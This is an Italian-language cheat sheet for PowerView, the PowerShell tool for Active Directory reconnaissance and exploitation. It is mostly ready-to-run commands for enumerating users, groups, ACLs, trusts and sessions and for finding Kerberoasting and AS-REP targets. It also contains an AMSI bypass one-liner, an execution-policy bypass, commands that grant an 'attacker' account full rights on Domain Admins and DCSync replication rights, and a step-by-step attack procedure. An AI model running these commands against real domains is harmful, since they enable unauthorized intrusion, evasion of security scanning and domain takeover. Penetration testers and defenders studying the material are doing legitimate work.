# ⚡ PowerView - Enumerazione AD con PowerShell

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  Ricognizione Active Directory con PowerShell
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

> **Nota di compatibilità:** PowerView, SharpHound e BloodHound sono componenti distinti; la provenienza indicata dall’originale è storica. Il documento mescola funzioni di generazioni diverse di PowerView. `AdminCount` può restare impostato dopo modifiche all’appartenenza ai gruppi; `-CheckShareAccess` verifica l’accesso, non prova da solo la scrivibilità. ACL e relazioni di trust richiedono il contesto dell’oggetto e della direzione osservata; una riga filtrata non dimostra automaticamente un percorso sfruttabile. L’execution policy non è un confine di sicurezza e il frammento AMSI è legato a implementazioni/versioni specifiche. Vedi il [sorgente originale PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

---

## 📋 Indice

- [Che cos'è PowerView](#-che-cosè-powerview)
- [Configurazione](#-configurazione)
- [Enumerazione del dominio](#-enumerazione-del-dominio)
- [Enumerazione degli utenti](#-enumerazione-degli-utenti)
- [Enumerazione dei gruppi](#-enumerazione-dei-gruppi)
- [Enumerazione dei computer](#-enumerazione-dei-computer)
- [Enumerazione delle ACL](#-enumerazione-delle-acl)
- [Enumerazione delle relazioni di trust](#-enumerazione-delle-relazioni-di-trust)
- [Enumerazione dei GPO](#-enumerazione-dei-gpo)
- [Ricerca di accessi e sessioni](#-ricerca-di-accessi-e-sessioni)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🎯 Che cos'è PowerView

**PowerView** è uno strumento PowerShell per l'enumerazione e lo sfruttamento di Active Directory:

- 🔍 **Enumerazione** - Utenti, gruppi, computer e criteri di gruppo (GPO)
- 🔐 **ACL** - Individua permessi configurati in modo errato
- 🌐 **Relazioni di trust** - Mappa le relazioni di fiducia fra domini
- 🎯 **Ricerca delle sessioni** - Individua dove gli utenti hanno effettuato l'accesso

---

## 🚀 Configurazione

### Scarica PowerView

```powershell
# Da PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# Da SharpHound
# PowerView.ps1 incluso con BloodHound (indicazione storica dell'originale)
```

### Importa il modulo

```powershell
# Aggira l'execution policy
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Importa
Import-Module .\PowerView.ps1

# Oppure carica tramite dot sourcing
. .\PowerView.ps1
```

### Bypass AMSI (se necessario)

```powershell
# Bypass semplice
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 🏢 Enumerazione del dominio

### Informazioni di base sul dominio

```powershell
# Ottieni informazioni sul dominio
Get-Domain

# Ottieni il SID del dominio
Get-DomainSID

# Ottieni i criteri del dominio
Get-DomainPolicy

# Ottieni i controller di dominio
Get-DomainController
Get-DomainController -Domain other.domain.local

# Ottieni informazioni sulla foresta
Get-Forest
Get-ForestDomain
```

### Criteri del dominio

```powershell
# Criteri delle password
(Get-DomainPolicy)."SystemAccess"

# Criteri Kerberos
(Get-DomainPolicy)."KerberosPolicy"
```

---

## 👤 Enumerazione degli utenti

### Elenca gli utenti

```powershell
# Tutti gli utenti
Get-DomainUser

# Utente specifico
Get-DomainUser -Identity admin

# Proprietà degli utenti
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# Utenti con una descrizione
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

### Trova utenti interessanti

```powershell
# Utenti con SPN (esposti al Kerberoasting)
Get-DomainUser -SPN

# Utenti senza preautenticazione (AS-REP)
Get-DomainUser -PreauthNotRequired

# Utenti con AdminCount (protetti secondo l'originale)
Get-DomainUser -AdminCount

# Utenti con password nella descrizione
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

### Sessioni degli utenti

```powershell
# Dove ha effettuato l'accesso l'utente
Find-DomainUserLocation -UserIdentity admin

# Trova utenti con accesso amministrativo
Find-LocalAdminAccess
```

---

## 👥 Enumerazione dei gruppi

### Elenca i gruppi

```powershell
# Tutti i gruppi
Get-DomainGroup

# Gruppo specifico
Get-DomainGroup -Identity "Domain Admins"

# Membri del gruppo
Get-DomainGroupMember -Identity "Domain Admins"

# Membri ricorsivi
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Gruppi importanti

```powershell
# Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Enterprise Admins
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrators
Get-DomainGroupMember -Identity "Administrators"

# Trova i gruppi a cui appartiene un utente
Get-DomainGroup -UserName admin
```

### Gruppi locali

```powershell
# Amministratori locali sul computer
Get-NetLocalGroupMember -ComputerName server01

# Amministratori locali su tutti i computer
Find-DomainLocalGroupMember -GroupName Administrators
```

---

## 💻 Enumerazione dei computer

### Elenca i computer

```powershell
# Tutti i computer
Get-DomainComputer

# Computer specifico
Get-DomainComputer -Identity server01

# Proprietà
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# Computer con delega senza vincoli
Get-DomainComputer -Unconstrained
```

### Trova i bersagli

```powershell
# Controller di dominio
Get-DomainController

# Server
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Sistema operativo obsoleto
Get-DomainComputer -OperatingSystem "*2008*"
```

### Condivisioni

```powershell
# Trova le condivisioni
Find-DomainShare

# Condivisioni scrivibili (etichetta dell'originale: vedi nota)
Find-DomainShare -CheckShareAccess

# File interessanti nelle condivisioni
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

## 🔐 Enumerazione delle ACL

### ACL di base

```powershell
# ACL dell'utente
Get-DomainObjectAcl -Identity admin

# Risolvi i GUID
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# Diritti specifici
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### Trova ACL interessanti

```powershell
# GenericAll su un utente
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### Diritti DCSync

```powershell
# Trova i diritti DCSync
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

### Modifica l'ACL

```powershell
# Aggiungi GenericAll per un utente
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Aggiungi i diritti DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

## 🤝 Enumerazione delle relazioni di trust

### Relazioni di trust del dominio

```powershell
# Ottieni le relazioni di trust
Get-DomainTrust

# Tutte le relazioni di trust
Get-DomainTrust -Domain domain.local

# Mappa tutte le relazioni di trust
Get-DomainTrustMapping
```

### Relazioni di trust della foresta

```powershell
# Relazioni di trust della foresta
Get-ForestTrust

# Domini della foresta
Get-ForestDomain
```

### Tipi di trust

| Tipo di trust | Direzione | Descrizione |
|------------|-----------|-------------|
| Bidirezionale | In entrambe le direzioni | I due domini si fidano reciprocamente |
| In ingresso (Inbound) | Unidirezionale | L'altro dominio si fida di noi |
| In uscita (Outbound) | Unidirezionale | Ci fidiamo dell'altro dominio |

---

## 📜 Enumerazione dei GPO

### Elenca i GPO

```powershell
# Tutti i GPO
Get-DomainGPO

# GPO per nome
Get-DomainGPO -Identity "Default Domain Policy"

# GPO su una specifica unità organizzativa (OU)
Get-DomainGPO -ComputerIdentity server01
```

### Trova i permessi dei GPO

```powershell
# GPO che l'utente può modificare
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

### Posizioni dei GPO

```powershell
# OU a cui si applica il GPO
Get-DomainOU -GPLink "{GPO-GUID}"

# GPO su un computer specifico
Get-DomainGPO -ComputerIdentity "server01"
```

---

## 🎯 Ricerca di accessi e sessioni

### Trova accessi amministrativi

```powershell
# Dove disponiamo di accesso amministrativo locale?
Find-LocalAdminAccess

# Con più thread
Find-LocalAdminAccess -Threads 10

# Su computer specifici
Find-LocalAdminAccess -ComputerFile computers.txt
```

### Trova le posizioni degli utenti

```powershell
# Dove ha effettuato l'accesso l'utente?
Find-DomainUserLocation

# Utente specifico
Find-DomainUserLocation -UserIdentity admin

# Solo computer a cui abbiamo accesso
Find-DomainUserLocation -CheckAccess
```

### Trova le sessioni

```powershell
# Sessioni sul computer
Get-NetSession -ComputerName dc01

# Utenti che hanno effettuato l'accesso
Get-NetLoggedon -ComputerName server01

# Sessioni RDP
Get-NetRDPSession -ComputerName server01
```

### Cerca utenti specifici

```powershell
# Trova i Domain Admins
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Verifica dove hanno effettuato l'accesso
Invoke-UserHunter

# Modalità meno evidente (stealth)
Invoke-UserHunter -Stealth
```

---

## 📊 Riferimento rapido

### Comandi essenziali

| Comando | Descrizione |
|---------|-------------|
| `Get-Domain` | Informazioni sul dominio |
| `Get-DomainUser` | Elenca gli utenti |
| `Get-DomainGroup` | Elenca i gruppi |
| `Get-DomainComputer` | Elenca i computer |
| `Get-DomainController` | Elenca i controller di dominio |
| `Get-DomainTrust` | Elenca le relazioni di trust |
| `Get-DomainGPO` | Elenca i GPO |
| `Find-LocalAdminAccess` | Trova accessi amministrativi |
| `Find-DomainUserLocation` | Trova le sessioni degli utenti |

### Bersagli Kerberos

| Comando | Descrizione |
|---------|-------------|
| `Get-DomainUser -SPN` | Esposto al Kerberoasting |
| `Get-DomainUser -PreauthNotRequired` | Esposto all'AS-REP roasting |
| `Get-DomainComputer -Unconstrained` | Delega senza vincoli |

### Filtri comuni

```powershell
# Filtra per proprietà
Get-DomainUser -Properties samaccountname,description

# Filtro LDAP
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Clausola Where
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

### Procedura di attacco

```powershell
# 1. Importa
Import-Module .\PowerView.ps1

# 2. Enumera il dominio
Get-Domain
Get-DomainController

# 3. Trova gli utenti
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. Trova accessi amministrativi
Find-LocalAdminAccess

# 5. Cerca gli utenti
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. Verifica le ACL
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

## 📚 Risorse

- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [Scheda di riferimento PowerView](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Schede correlate
- [BloodHound](../../BloodHound/translations/README.it.md)
- [PowerShell](../../PowerShell/translations/README.it.md)
- [Mimikatz](../../Mimikatz/translations/README.it.md)

---

<p align="center">
  <b>⚡ Ricognizione AD con PowerShell!</b><br>
  <i>PowerView - Lo storico strumento di enumerazione AD</i>
</p>
